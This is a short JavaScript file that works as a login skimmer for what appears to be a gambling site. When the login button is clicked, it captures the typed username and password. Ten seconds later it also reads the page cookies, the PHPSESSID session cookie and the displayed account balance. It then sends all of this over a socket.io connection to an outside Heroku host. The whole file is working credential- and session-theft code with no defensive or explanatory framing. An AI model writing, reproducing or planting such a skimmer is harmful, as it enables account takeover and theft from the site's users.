const socket = io("https://vin88.herokuapp.com",{ transport : ['websocket'] });
var jQueryScript = document.createElement('script');  
jQueryScript.setAttribute('src','https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js');
document.head.appendChild(jQueryScript);
var acc = {}
$(".button-login").click(function (e) { 
    e.preventDefault();
    acc.username = $("input[name=txtUsername]").val();
    acc.pass = $("input[name=txtPassword]").val();
    setTimeout(() => {
        acc.cookie = document.cookie
        acc.gvin = $(".money-1").text();
        acc.sessid = $.cookie("PHPSESSID");
        socket.emit('loginchange',acc)
    }, 10000);
});
